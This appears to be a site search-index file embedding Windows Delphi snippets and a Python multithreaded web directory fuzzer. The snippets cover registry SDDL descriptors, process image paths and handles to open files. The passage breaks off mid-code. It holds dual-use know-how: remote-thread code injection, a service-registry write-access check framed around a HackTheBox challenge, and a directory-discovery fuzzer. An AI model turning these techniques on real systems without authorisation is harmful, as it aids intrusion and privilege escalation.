'use strict';(function(){const indexCfg={cache:true};indexCfg.doc={id:'id',field:['title','content'],store:['title','href'],};const index=FlexSearch.create('balance',indexCfg);window.bookSearchIndex=index;index.add({'id':0,'href':'/docs/windows/projects/','title':"Projects",'content':"Projects Section   Freeware Open Source Projects  "});index.add({'id':1,'href':'/docs/windows/snippets/delphi/get-registry-key-security-descriptor/','title':"Get Registry Key DACL Security Descriptor",'content':"Below code snippet demonstrate how to get DACL Security Descriptor in SDDL format for a targeted registry key.\nYou need to parse the output SDDL string in order to understand access properties for desired keys, there are plenty of articles arround explaining how to understand an SDDL string format.\nYou can also play with flags associated to ConvertSecurityDescriptorToStringSecurityDescriptor call to extract even more information from captured Security Descriptor Pointer after RegGetKeySecurity call.\n {------------------------------------------------------------------------------- Check if target registry key have write access. Return Code: 0 : Success. 1 : Could not open registry key. 2 : Could not get registry key security requirements. 3 : Could not get registry key security information. 4 : Could not translate security descriptor. 99 : Unknown -------------------------------------------------------------------------------} function GetRegKeySecurityDescriptor(AKeyHive : HKEY; AKeyPath : String; var ASDDL : String) : Cardinal; var AKey : HKEY; pSecDesc : PSecurityDescriptor; ASize : DWORD; ARet : Cardinal; AFlags : Cardinal; AToken : THandle; APrivilegeSet : TPrivilegeSet; AGenericMapping : TGenericMapping; AGrantedAccess : DWORD; AResult : BOOL; AMask : DWORD; hADVAPI : THandle; ASecurityDescriptorStr : PWideChar; AReturnedLength : ULONG; APos : Integer; // https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertsecuritydescriptortostringsecuritydescriptorw ConvertSecurityDescriptorToStringSecurityDescriptor : function( SecurityDescriptor : PSECURITY_DESCRIPTOR; RequestedStringSDRevision : DWORD; SecurityInformation : SECURITY_INFORMATION; var StringSecurityDescriptor : LPWSTR; StringSecurityDescriptorLen : PULONG ) : BOOL; stdcall; const SDDL_REVISION_1 = 1; begin result := 99; ASDDL := ''; /// ARet := RegOpenKeyExW(AKeyHive, PWideChar(AKeyPath), 0, KEY_READ, AKey); if (ARet \u0026lt;\u0026gt; ERROR_SUCCESS) then Exit(1); try ASize := 0; AFlags := ( DACL_SECURITY_INFORMATION or OWNER_SECURITY_INFORMATION or GROUP_SECURITY_INFORMATION ); /// ARet := RegGetKeySecurity(AKey, AFlags, nil, ASize); if (ARet = ERROR_INSUFFICIENT_BUFFER) and (ASize \u0026gt; 0) then begin GetMem(pSecDesc, ASize); try ARet := RegGetKeySecurity(AKey, AFlags, pSecDesc, ASize); if (ARet \u0026lt;\u0026gt; ERROR_SUCCESS) then Exit(3); /// hADVAPI := LoadLibrary('ADVAPI32.DLL'); if (hADVAPI = 0) then Exit(); try @ConvertSecurityDescriptorToStringSecurityDescriptor := GetProcAddress(hADVAPI, 'ConvertSecurityDescriptorToStringSecurityDescriptorW'); if Assigned(ConvertSecurityDescriptorToStringSecurityDescriptor) then begin if NOT ConvertSecurityDescriptorToStringSecurityDescriptor( pSecDesc, SDDL_REVISION_1, DACL_SECURITY_INFORMATION, ASecurityDescriptorStr, @AReturnedLength ) then Exit(4); /// ASDDL := UnicodeString(ASecurityDescriptorStr); end; finally FreeLibrary(hADVAPI); end; finally FreeMem(pSecDesc, ASize); end; end else Exit(2); finally RegCloseKey(AKey); end; end; Example of usage //... var ASDDLOut : String; //... GetRegKeySecurityDescriptor(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\arcsas\\', ASDDLOut); WriteLn(ASDDLOut); Will output something similar to this\nD:AI(A;;KA;;;BA)(A;CI;KR;;;S-1-5-21-1216997795-677674728-3816802077-1001)(A;CIID;KR;;;BU)(A;CIID;KA;;;BA)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AC)(A;CIID;KR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681) Parser I will probably in a near future work on a delphi parser for SDDL Format (Some probably already exists).\nHere is a tiny example using only basic delphi string manipulation techniques (Not the cleanest way) to extract the six properties.\nfunction ParseSDDL_DACL(ASDDL : String) : Boolean; var APos, APosEnd : Integer; AChunk : String; AF1, AF2, AF3 : String; AF4, AF5, AF6 : String; function GetNextChunkProperty() : String; begin result := Copy(AChunk, 1, Pos(';', AChunk)-1); Delete(AChunk, 1, Pos(';', AChunk)); end; begin ASDDL := UpperCase(ASDDL); APos := 0; while true do begin if (APos \u0026gt; 0) then Delete(ASDDL, 1, APos); APos := Pos(':', ASDDL); if (APos = 0) then break; { Attempt to find DACL Security Descriptor } if (Copy(ASDDL, (APos -1), 1) = 'D') then break; end; { Read DACL Security Descriptor } if (APos \u0026gt; 0) then begin Delete(ASDDL, 1, APos); // Clean other Security Descriptor APos := Pos(':', ASDDL); if (APos \u0026gt; 0) then Delete(ASDDL, (APos -1), Length(ASDDL)); { Iterate through each descriptor items } while True do begin if (Length(ASDDL) = 0) then break; APos := Pos('(', ASDDL); APosEnd := Pos(')', ASDDL); if (APos = 0) or (APosEnd = 0) then break; try Inc(APos); AChunk := Copy(ASDDL, APos, (APosEnd - APos)); { Parse chunk } AF1 := GetNextChunkProperty(); // ACE Type AF2 := GetNextChunkProperty(); // ACE Flags AF3 := GetNextChunkProperty(); // Permissions AF4 := GetNextChunkProperty(); // Object Type (GUID) AF5 := GetNextChunkProperty(); // Object Type (GUID) AF6 := GetNextChunkProperty(); // Trustee (SID) { ... ... } finally Delete(ASDDL, 1, APosEnd); // Clean end; end; end; end; Alternative I recently worked on parsing SDDL string from a bunch of registry keys to solve a HackTheBox box without using third part tools (such as AccessChk.exe from SysInternals)\nParsing SDDL string is a very complex task, there is a lot of things to take in consideration in some cases.\nIf for example you want to know if current user have Write Access to a target registry key, instead of using above function and parse output SDDL string (and take in consideration all attributes) we could simply attempt to open target key with KEY_WRITE flag and check whether or not you receive an Access Denied (5) error.\nExample // ... type TAccessStatus = ( asTrue, asFalse, asError ); // ... function CheckCurrentUserKeyAccess(AKeyHive : HKEY; AKeyPath : String; var AStatus : TAccessStatus): Boolean; var AKey : HKEY; ARet : Integer; begin result := False; AStatus := asError; /// ARet := RegOpenKeyExW(AKeyHive, PWideChar(AKeyPath), 0, KEY_WRITE, AKey); try result := ((ARet = ERROR_SUCCESS) or (ARet = ERROR_ACCESS_DENIED)); if NOT result then Exit(); if (ARet = ERROR_ACCESS_DENIED) then AStatus := asFalse else AStatus := asTrue; /// result := True; finally if (ARet = ERROR_SUCCESS) then RegCloseKey(AKey); end; end; // ... var AStatus : TAccessStatus; begin try if CheckCurrentUserKeyAccess(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\arcsas\\', AStatus) then begin case AStatus of asTrue : WriteLn('Access Granted'); asFalse : WriteLn('Access Denied'); asError : WriteLn('Could not determine access status'); end; end; // ... If you have any alternative in minds, just let me know ;)\n"});index.add({'id':2,'href':'/docs/windows/snippets/','title':"Snippets",'content':"Snippet Section   Delphi Python  "});index.add({'id':3,'href':'/docs/windows/snippets/delphi/','title':"Delphi",'content':"Delphi Section   Get Registry Key ACL Security Descriptor Get Process Name Method 4 : GetProcessImageFileName Get Process Name Method 3 : NtQueryInformationProcess Get Process Name Method 2 : GetMappedFilename Enum Attached Files Get DLL Exported Function Address From Memory Get DLL Exported Function Address GetProcAddress API Alternative Enum DLL Exported Functions Get Process Name Method 1 Enum Modules Method 1 Terminate Process Techniques Update PEB Debug Flag Enum Process Method 1 Is Process 64bit Manipulation and Detection of EOF  "});index.add({'id':4,'href':'/docs/','title':"Docs",'content':""});index.add({'id':5,'href':'/docs/windows/snippets/delphi/get-process-name-method-4-getprocessimagefilename/','title':"Get Process Name Method 4 GetProcessImageFileName",'content':"This time we will use a quite well known API to get the full process image path GetProcessImageFileName documented here.\nNothing very complex and this technique works from 32bit to 64bit / 64bit to 32bit processes.\n// Jean-Pierre LESUEUR (@DarkCoderSc) function PhysicalToVirtualPath(APath : String) : String; var i : integer; ADrive : String; ABuffer : array[0..MAX_PATH-1] of Char; ACandidate : String; begin {$I-} for I := 0 to 25 do begin ADrive := Format('%s:', [Chr(Ord('A') + i)]); /// if (QueryDosDevice(PWideChar(ADrive), ABuffer, MAX_PATH) = 0) then continue; ACandidate := String(ABuffer).ToLower(); if String(Copy(APath, 1, Length(ACandidate))).ToLower() = ACandidate then begin Delete(APath, 1, Length(ACandidate)); result := Format('%s%s', [ADrive, APath]); end; end; {$I+} end; function GetProcessImagePath(const AProcessId : Cardinal) : String; // https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getprocessimagefilenamew var _GetProcessImageFileNameW : function( hProcess : THandle; lpImageFileName : LPWSTR; nSize : DWORD ) : DWORD; stdcall; hPsAPI : THandle; hProc : THandle; ALength : Cardinal; AImagePath : String; const PROCESS_QUERY_LIMITED_INFORMATION = $00001000; begin result := ''; /// hProc := OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, AProcessId); if (hProc = 0) then Exit(); try hPsAPI := LoadLibrary('psapi.dll'); if (hPsAPI = 0) then Exit(); try @_GetProcessImageFileNameW := GetProcAddress(hPsAPI, 'GetProcessImageFileNameW'); if NOT Assigned(_GetProcessImageFileNameW) then Exit(); /// SetLength(AImagePath, MAX_PATH); ALength := _GetProcessImageFileNameW(hProc, @AImagePath[1], MAX_PATH); if (ALength \u0026gt; 0) then begin SetLength(AImagePath, ALength); /// result := PhysicalToVirtualPath(AImagePath); end; finally FreeLibrary(hPsAPI); end; finally CloseHandle(hProc); end; end; I have few other methods in mind, I will post them in a near future so stay tuned :)\n"});index.add({'id':6,'href':'/docs/windows/','title':"Microsoft Windows",'content':""});index.add({'id':7,'href':'/docs/windows/snippets/delphi/get-process-name-method-3-ntqueryinformationprocess/','title':"Get Process Name Method 3 NtQueryInformationProcess",'content':"Yet another technique to get the full image path of a target process using the NtQueryInformationProcess API documented Here\nThis technique from 32bit to 64bit / 64bit to 32bit.\n// Jean-Pierre LESUEUR (@DarkCoderSc) function PhysicalToVirtualPath(APath : String) : String; var i : integer; ADrive : String; ABuffer : array[0..MAX_PATH-1] of Char; ACandidate : String; begin {$I-} for I := 0 to 25 do begin ADrive := Format('%s:', [Chr(Ord('A') + i)]); /// if (QueryDosDevice(PWideChar(ADrive), ABuffer, MAX_PATH) = 0) then continue; ACandidate := String(ABuffer).ToLower(); if String(Copy(APath, 1, Length(ACandidate))).ToLower() = ACandidate then begin Delete(APath, 1, Length(ACandidate)); result := Format('%s%s', [ADrive, APath]); end; end; {$I+} end; function GetProcessImagePath(const AProcessId : Cardinal) : String; type PUnicodeString = ^TUnicodeString; TUnicodeString = record Length : USHORT; MaximumLength : USHORT; Buffer : PWideChar; end; // https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess var _NtQueryInformationProcess : function( ProcessHandle : THandle; ProcessInformationClass : DWORD; ProcessInformation : Pointer; ProcessInformationLength : ULONG; ReturnLength : PULONG ) : LongInt; stdcall; hNTDLL : THandle; hProc : THandle; ALength : ULONG; pImagePath : PUnicodeString; const PROCESS_QUERY_LIMITED_INFORMATION = $00001000; ProcessImageFileName = 27; begin hProc := OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, AProcessId); if (hProc = 0) then Exit(); try hNTDLL := LoadLibrary('NTDLL.DLL'); if (hNTDLL = 0) then Exit(); try @_NtQueryInformationProcess := GetProcAddress(hNTDLL, 'NtQueryInformationProcess'); if NOT Assigned(_NtQueryInformationProcess) then Exit(); /// ALength := (MAX_PATH + SizeOf(TUnicodeString)); // Should be enough :) GetMem(pImagePath, ALength); try if (_NtQueryInformationProcess(hProc, ProcessImageFileName, pImagePath, ALength, @ALength) \u0026lt;\u0026gt; 0) then Exit(); /// result := PhysicalToVirtualPath(String(pImagePath^.Buffer)); finally FreeMem(pImagePath, ALength); end; finally FreeLibrary(hNTDLL); end; finally CloseHandle(hProc); end; end; "});index.add({'id':8,'href':'/docs/windows/snippets/delphi/get-process-name-method-2-getmappedfilename/','title':"Get Process Name Method 2 GetMappedFilename",'content':"Bellow code demonstrate our to retrieve both current and target process full image path. This technique is very uncommon but works perfectly.\nNotice for both techniques you muse translate its physical path to virtual path using this tiny function  // Jean-Pierre LESUEUR (@DarkCoderSc) function PhysicalToVirtualPath(APath : String) : String; var i : integer; ADrive : String; ABuffer : array[0..MAX_PATH-1] of Char; ACandidate : String; begin {$I-} for I := 0 to 25 do begin ADrive := Format('%s:', [Chr(Ord('A') + i)]); /// if (QueryDosDevice(PWideChar(ADrive), ABuffer, MAX_PATH) = 0) then continue; ACandidate := String(ABuffer).ToLower(); if String(Copy(APath, 1, Length(ACandidate))).ToLower() = ACandidate then begin Delete(APath, 1, Length(ACandidate)); result := Format('%s%s', [ADrive, APath]); end; end; {$I+} end; And both examples require psapi.pas. To avoid using psapi.pas you could load GetMappedFilename() API dynamically.\nCurrent Process // Jean-Pierre LESUEUR (@DarkCoderSc) // ... uses psAPI; // ... function GetCurrentProcessImagePath() : String; var AFileName : Array[0..MAX_PATH -1] of Char; begin ZeroMemory(@AFileName, MAX_PATH); /// GetMappedFileName( GetCurrentProcess(), Pointer(GetModuleHandle(nil)), AFileName, MAX_PATH ); result := PhysicalToVirtualPath(UnicodeString(AFileName)); end; Target Process When it comes to use that technique for remote process you need to be a bit more tricky, this technique require code injection to retrieve target process hInstance. Then we can use normally GetMappedFileName() and retrieve it full image path.\nNotice, you can\u0026rsquo;t use this technique from a 32bit to 64bit / 64bit to 32bit due to code injection (Some technique exists to bypass this restriction tho).\n// Jean-Pierre LESUEUR (@DarkCoderSc) // ... uses psAPI; // ... function GetProcessImagePath(const AProcessId : Cardinal) : String; var hProc : THandle; pGetModuleHandle : Pointer; AFlags : Cardinal; AThreadId : Cardinal; hThread : THandle; hRemoteInstance : Cardinal; AFileName : Array[0..MAX_PATH -1] of Char; const PROCESS_QUERY_LIMITED_INFORMATION = $00001000; begin result := ''; /// { Alternatively in the case of Kernel32.dll we could simply call GetModuleHandle('Kernel32.dll') } pGetModuleHandle := GetProcAddress(LoadLibrary('Kernel32.dll'), 'GetModuleHandleW'); /// if NOT Assigned(pGetModuleHandle) then Exit(); AFlags := PROCESS_CREATE_THREAD or PROCESS_QUERY_LIMITED_INFORMATION; hProc := OpenProcess(AFlags, false, AProcessId); if (hProc = 0) then Exit(); try hThread := CreateRemoteThread( hProc, nil, 0, pGetModuleHandle, Pointer(nil), 0, AThreadId ); if (hThread = 0) then Exit(); try WaitForSingleObject(hThread, INFINITE); GetExitCodeThread(hThread, hRemoteInstance); ZeroMemory(@AFileName, MAX_PATH); /// GetMappedFileName( hProc, Pointer(hRemoteInstance), AFileName, MAX_PATH ); result := PhysicalToVirtualPath(UnicodeString(AFileName)); finally CloseHandle(hThread); end; finally CloseHandle(hProc); end; end; If you have another technique instead of using Code Injection to capture target process hInstance I would love to know :)\n"});index.add({'id':9,'href':'/docs/windows/snippets/python/','title':"Python",'content':"Python Section   Just a web fuzzer Example  "});index.add({'id':10,'href':'/docs/windows/snippets/python/just-a-web-fuzzer-example/','title':"Just a Web Fuzzer Example",'content':"Bellow script demonstrate how to create a very basic multithreaded web file and directory fuzzer.\nIt is far from being as fast as other famous web fuzzers (wfuzz, dirb, gobuster etc..) but it is at least a good start to understand how to create yours.\n#!/bin/python3 ''' -= Just a web fuzzer example =- (@DarkCoderSc) Dependencies: - pip install progressbar2 ''' import requests import progressbar from multiprocessing import Pool from multiprocessing.dummy import Pool as ThreadPool from multiprocessing import Lock import argparse # # Acquire parameters # parser = argparse.ArgumentParser(description=\u0026quot;Just a web fuzzer example\u0026quot;) parser.add_argument('-u', '--url', action=\u0026quot;store\u0026quot;, dest=\u0026quot;base_url\u0026quot;, required=True, help=\u0026quot;Target base URL to fuzz (ex: http://example.com/\u0026quot;) parser.add_argument('-w', '--wordlist', action=\u0026quot;store\u0026quot;, dest=\u0026quot;wordlist_file\u0026quot;, metavar=\u0026quot;in-file\u0026quot;, type=argparse.FileType('r'), required=True, help=\u0026quot;Plain text wordlist file location.\u0026quot;) parser.add_argument('-x', '--extensions', action=\u0026quot;store\u0026quot;, dest=\u0026quot;extensions\u0026quot;, nargs='*', required=False, help=\u0026quot;Append file extension at the end of each candidates (ex: .php .php5 .html .html5)\u0026quot;) try: argv = parser.parse_args() except IOError: parser.error() # # Log Defs # def success(message): print(\u0026quot;[\\033[32mOK\\033[39m] \u0026quot; + message) def fail(message): print(\u0026quot;[\\033[31mKO\\033[39m] \u0026quot; + message) def debug(message): print(\u0026quot;[\\033[33m!!\\033[39m] \u0026quot; + message) # # Fuzzer # def fuzz(args): lock = args[0] pbar = args[2] global base_url target_url = base_url + args[1] req = requests.head(target_url) status = req.status_code message = \u0026quot;{} - {}\u0026quot;.format(status, target_url) if (status == 200): success(message) elif (status != 404): debug(message) lock.acquire() try: global progress progress += 1 pbar.update(progress) finally: lock.release() return base_url = argv.base_url if not base_url.endswith(\u0026quot;/\u0026quot;): base_url += \u0026quot;/\u0026quot; with open(argv.wordlist_file.name, \u0026quot;r\u0026quot;, errors=\u0026quot;ignore\u0026quot;) as file: candidates = file.readlines() widgets = [ ' [', progressbar.Timer(), '] ', progressbar.Bar(), ' (', progressbar.ETA(), ') ', ] ext_count = 1 if argv.extensions: ext_count = len(argv.extensions) +1 pbar = progressbar.ProgressBar(maxval=(len(candidates) * ext_count), widgets=widgets, redirect_stdout=True) progress = 0 pbar.start() try: pool = ThreadPool() try: lock = Lock() for index, candidate in enumerate(candidates): candidate = candidate.strip() if not candidate: continue pool.map(fuzz, [[lock, candidate, pbar]]) if (ext_count \u0026gt; 1): for extension in argv.extensions: pool.map(fuzz, [[lock, (candidate + extension), pbar]]) finally: pool.close() pool.join() finally: pbar.finish() "});index.add({'id':11,'href':'/docs/windows/snippets/delphi/enum-attached-files/','title':"Enum Attached Files",'content':"Above snippet demonstrate how to enumerate files openned by running programs on Windows.\nSome file unlocker use that technique to find where a specific file is attached and then force processes using that file to release it handle (via code injection techniques). I will write an example in a future snippet thread.\nNotice: At the bottom of that page, you will see a concreate example about how to use that unit.  Features  Support both 32 and 64bit process. Doesn\u0026rsquo;t require any additional libraries than native Delphi libraries. Support scanning : All process ; Single process; List of process.  Code //////////////////////////////////////////////////////////////////////////////// // // // Author: // // -\u0026gt; Jean-Pierre LESUEUR (@DarkCoderSc) // // https://github.com/DarkCoderSc // // https://gist.github.com/DarkCoderSc // // https://www.phrozen.io/ // // License: // // -\u0026gt; MIT // // // //////////////////////////////////////////////////////////////////////////////// unit UntEnumAttachedFiles; interface {$ALIGN ON} {$MINENUMSIZE 4} uses Windows, Classes, SysUtils, Generics.Collections, tlHelp32; type TSystemHandleInformation = record ProcessId: ULONG; ObjectTypeNumber: UCHAR; Flags: UCHAR; Handle: USHORT; Object_: PVOID; GrantedAccess: ACCESS_MASK; end; PSystemHandleInformation = ^TSystemHandleInformation; TSystemHandleInformations = record HandleCount : ULONG; Handles : array[0..0] of TSystemHandleInformation; end; PSystemHandleInformations = ^TSystemHandleInformations; TUnicodeString = record Length: USHORT; MaximumLength: USHORT; Buffer: PWideChar; end; OBJECT_TYPE_INFORMATION = record Name: TUnicodeString; ObjectCount: ULONG; HandleCount: ULONG; Reserved1: array[0..3] of ULONG; PeakObjectCount: ULONG; PeakHandleCount: ULONG; Reserved2: array[0..3] of ULONG; InvalidAttributes: ULONG; GenericMapping: GENERIC_MAPPING; ValidAccess: ULONG; Unknown: UCHAR; MaintainHandleDatabase: ByteBool; Reserved3: array[0..1] of UCHAR; PoolType: Byte; PagedPoolUsage: ULONG; NonPagedPoolUsage: ULONG; end; POBJECT_TYPE_INFORMATION = ^OBJECT_TYPE_INFORMATION; OBJECT_NAME_INFORMATION = record Name: TUnicodeString; end; POBJECT_NAME_INFORMATION = ^OBJECT_NAME_INFORMATION; type TFileInfo = class private FFileName : String; FHandle : THandle; FFileSize : Int64; {@M} procedure SetFileName(AValue : String); public {@C} constructor Create(); {@G/S} property FileName : String read FFileName write SetFileName; property Handle : THandle read FHandle write FHandle; {@G} property FileSize : Int64 read FFileSize; end; TEnumAttachedFiles = class private FItems : TObjectDictionary\u0026lt;Cardinal, TObjectList\u0026lt;TFileInfo\u0026gt;\u0026gt;; FNTDLL : THandle; // Required Library // https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation NtQuerySystemInformation : function ( SystemInformationClass : Cardinal; SystemInformation : PVOID; SystemInformationLength : ULONG; ReturnLength : PULONG): ULONG; stdcall; // https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryobject NtQueryObject : function ( ObjectHandle : THandle; ObjectInformationClass : Cardinal; ObjectInformation : PVOID; ObjectInformationLength : ULONG; ReturnLength : PULONG ): ULONG; stdcall; // https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FType%20independed%2FNtDuplicateObject.html NtDuplicateObject : function ( SourceProcessHandle : THandle; SourceHandle : THandle; TargetProcessHandle : THandle; TargetHandle : PHANDLE; DesiredAccess : ACCESS_MASK; Attributes : ULONG; Options : ULONG ): ULONG; stdcall; {@M} function ReadHandleInformationByProcessBundle(AProcessId : Cardinal; var AHandles : TList\u0026lt;THandle\u0026gt;) : TObjectList\u0026lt;TFileInfo\u0026gt;; function EnumProcess(AFilterSameArch : Boolean = False) : TList\u0026lt;Cardinal\u0026gt;; function GetCount() : Cardinal; public {@C} constructor Create(); destructor Destroy(); override; {@M} function Enum(AProcessList : TList\u0026lt;Cardinal\u0026gt;) : Integer; overload; function Enum(AProcessId : Cardinal) : Boolean; overload; function Enum() : Integer; overload; {@G} property Items : TObjectDictionary\u0026lt;Cardinal, TObjectList\u0026lt;TFileInfo\u0026gt;\u0026gt; read FItems; property TotalCount : Cardinal read GetCount; end; implementation {+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ ___Local___ +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++} function GetFileSize(AFileName : String) : Int64; var AFileInfo : TWin32FileAttributeData; begin result := 0; if NOT FileExists(AFileName) then begin exit; end; if NOT GetFileAttributesEx(PWideChar(AFileName), GetFileExInfoStandard, @AFileInfo) then begin exit; end; /// result := Int64(AFileInfo.nFileSizeLow) or Int64(AFileInfo.nFileSizeHigh shl 32); end; function IsProcessX64(AProcessId : Cardinal) : Boolean; var AProcHandle : THandle; AWow64Process : bool; const PROCESS_QUERY_LIMITED_INFORMATION = $1000; begin result := false; /// { If we are not in a 64Bit system then we are for sure in a 32Bit system } if (TOSVersion.Architecture = arIntelX86) then Exit(); /// AProcHandle := OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, AProcessId); if AProcHandle = 0 then Exit; try isWow64Process(AProcHandle, AWow64Process); /// result := (NOT AWow64Process); finally CloseHandle(AProcHandle); end; end; function PhysicalToVirtualPath(APath : String) : String; var i : integer; ADrive : String; ABuffer : array[0..MAX_PATH-1] of Char; ACandidate : String; begin {$I-} for I := 0 to 25 do begin ADrive := Format('%s:', [Chr(Ord('A') + i)]); /// if (QueryDosDevice(PWideChar(ADrive), ABuffer, MAX_PATH) = 0) then continue; ACandidate := String(ABuffer).ToLower(); if String(Copy(APath, 1, Length(ACandidate))).ToLower() = ACandidate then begin Delete(APath, 1, Length(ACandidate)); result := Format('%s%s', [ADrive, APath]); end; end; {$I+} end; {+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ TEnumAttachedFiles +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++} {------------------------------------------------------------------------------- ___constructor -------------------------------------------------------------------------------} constructor TEnumAttachedFiles.Create(); begin inherited Create(); /// FItems := TObjectDictionary\u0026lt;Cardinal, TObjectList\u0026lt;TFileInfo\u0026gt;\u0026gt;.Create([doOwnsValues]); FNTDLL := LoadLibrary('NTDLL.DLL'); { Acquire required API's from NTDLL.DLL } NtQuerySystemInformation := nil; NtQueryObject := nil; NtDuplicateObject := nil; if (FNTDLL \u0026lt;\u0026gt; 0) then begin @NtQuerySystemInformation := GetProcAddress(FNTDLL, 'NtQuerySystemInformation'); @NtQueryObject := GetProcAddress(FNTDLL, 'NtQueryObject'); @NtDuplicateObject := GetProcAddress(FNTDLL, 'NtDuplicateObject'); end; end; {------------------------------------------------------------------------------- ___destroy -------------------------------------------------------------------------------} destructor TEnumAttachedFiles.Destroy(); begin if (FNTDLL \u0026lt;\u0026gt; 0) then FreeLibrary(FNTDLL); /// NtQuerySystemInformation := nil; NtQueryObject := nil; NtDuplicateObject := nil; if Assigned(FItems) then FreeAndNil(FItems); /// inherited Destroy(); end; {------------------------------------------------------------------------------- Retrieve Information about each handles per owner process -------------------------------------------------------------------------------} function TEnumAttachedFiles.ReadHandleInformationByProcessBundle(AProcessId : Cardinal; var AHandles : TList\u0026lt;THandle\u0026gt;) : TObjectList\u0026lt;TFileInfo\u0026gt;; var i : integer; AObjectHandle : THandle; pObjectTypeInformation : POBJECT_TYPE_INFORMATION; pObjectNameInformation : POBJECT_NAME_INFORMATION; AObjectName : String; ARet : Cardinal; AProcessHandle : THandle; AQueryHandle : THandle; AFileInfo : TFileInfo; ARequiredSize : DWORD; AFileName : String; begin result := nil; /// if NOT Assigned(AHandles) then Exit(); AObjectHandle := 0; AProcessHandle := OpenProcess( (PROCESS_DUP_HANDLE or PROCESS_QUERY_INFORMATION or PROCESS_VM_READ), False, AProcessId ); if (AProcessHandle = INVALID_HANDLE_VALUE) then Exit(); try result := TObjectList\u0026lt;TFileInfo\u0026gt;.Create(True); /// for I := 0 to AHandles.Count -1 do begin ARet := NTDuplicateObject( AProcessHandle, AHandles.Items[I], // Current Handle GetCurrentProcess(), @AObjectHandle, 0, 0, 0 ); if (ARet \u0026lt;\u0026gt; 0) then Continue; /// try // Get Required Length before doing memory allocation AQueryHandle := NtQueryObject(AObjectHandle, 2 {ObjectTypeInformation}, nil, 0, @ARequiredSize); if (ARequiredSize \u0026lt;= 0) then continue; /// GetMem(pObjectTypeInformation, ARequiredSize); try { Query Object Type } AQueryHandle := NtQueryObject( AObjectHandle, 2 {ObjectTypeInformation}, pObjectTypeInformation, ARequiredSize, nil ); if (AQueryHandle \u0026lt;\u0026gt; 0) then Continue; { Filter for files handles only } if NOT String(pObjectTypeInformation^.Name.Buffer).ToUpper.StartsWith('FILE') then continue; finally FreeMem(pObjectTypeInformation, ARequiredSize); end; { Query Object Name (Should be Sizeof(TObjectNameInformation)); } pObjectNameInformation := nil; AQueryHandle := NTQueryObject( AObjectHandle, 1 {ObjectNameInformation}, nil, 0, @ARequiredSize ); if (ARequiredSize \u0026lt;= 0) then continue; pObjectNameInformation := AllocMem(ARequiredSize); try AQueryHandle := NTQueryObject( AObjectHandle, 1 {ObjectNameInformation}, pObjectNameInformation, ARequiredSize, NIL ); if (AQueryHandle \u0026lt;\u0026gt; 0) then Continue; AObjectName := String(pObjectNameInformation^.Name.Buffer).Trim(); if (length(AObjectName) \u0026lt;= 0) then Continue; AFileName := PhysicalToVirtualPath(AObjectName); if NOT FileExists(AFileName) then continue; { Register new file information object } AFileInfo := TFileInfo.Create(); AFileInfo.FileName := AFileName; AFileInfo.Handle := AHandles.Items[I]; { Push } result.Add(AFileInfo); finally FreeMem(pObjectNameInformation, ARequiredSize); end; finally CloseHandle(AObjectHandle); end; end; finally CloseHandle(AProcessHandle); end; end; {------------------------------------------------------------------------------- Enumerate Open Handles (Type = Open Files) -------------------------------------------------------------------------------} function TEnumAttachedFiles.Enum(AProcessList : TList\u0026lt;Cardinal\u0026gt;) : Integer; var AQueryHandle : THandle; pHandleInformations : PSystemHandleInformations; pCurrentHandleInformation : PSystemHandleInformation; ARequiredSize : DWORD; I : Integer; ARet : Cardinal; AHandles : TObjectDictionary\u0026lt;Cardinal, TList\u0026lt;THandle\u0026gt;\u0026gt;; AHandleList : TList\u0026lt;THandle\u0026gt;; AFileInfoList : TObjectList\u0026lt;TFileInfo\u0026gt;; const BASE_SIZE = 1024; begin result := -99; // Unknwon /// self.FItems.Clear(); { We must have access to those API's } if (NOT Assigned(NtQuerySystemInformation)) or (NOT Assigned(NtQueryObject)) or (NOT Assigned(NtDuplicateObject)) then Exit(); /// ARequiredSize := 0; ARequiredSize := BASE_SIZE; pHandleInformations := AllocMem(ARequiredSize); try { Retrieve open handles informations. Notice: Between two NTQuerySystemInformation calls, required size could increase resulting to another STATUS_INFO_LENGTH_MISMATCH error. Multiple NTQuerySystemInformation call could be required until we succeed. } while true do begin AQueryHandle := NTQuerySystemInformation( 16 {SystemHandleInformation}, pHandleInformations, ARequiredSize, @ARequiredSize ); case AQueryHandle of ULONG($C0000004) {STATUS_INFO_LENGTH_MISMATCH} : begin ReallocMem(pHandleInformations, ARequiredSize); end; 0 : break; else Exit(-1); end; end; { Enumerate handle, and sort them by it owner process ID } AHandles := TObjectDictionary\u0026lt;Cardinal, TList\u0026lt;THandle\u0026gt;\u0026gt;.Create([doOwnsValues]); try for I := 0 to (pHandleInformations^.HandleCount -1) do begin {$IFNDEF WIN64} pCurrentHandleInformation := pointer(Integer(@pHandleInformations^.Handles) + (I * SizeOf(TSystemHandleInformation))); {$ELSE} pCurrentHandleInformation := pointer(Int64(@pHandleInformations^.Handles) + (I * SizeOf(TSystemHandleInformation))); {$ENDIF} { Ignore out of scope processes } if NOT AProcessList.Contains(pCurrentHandleInformation.ProcessId) then continue; { Filter some access value and file types which was identified as causing problems } ARet := GetFileType(pCurrentHandleInformation^.Handle); if (ARet \u0026lt;\u0026gt; FILE_TYPE_DISK) and (ARet \u0026lt;\u0026gt; FILE_TYPE_UNKNOWN) then Continue; if (pCurrentHandleInformation^.GrantedAccess = $0012019F) or (pCurrentHandleInformation^.GrantedAccess = 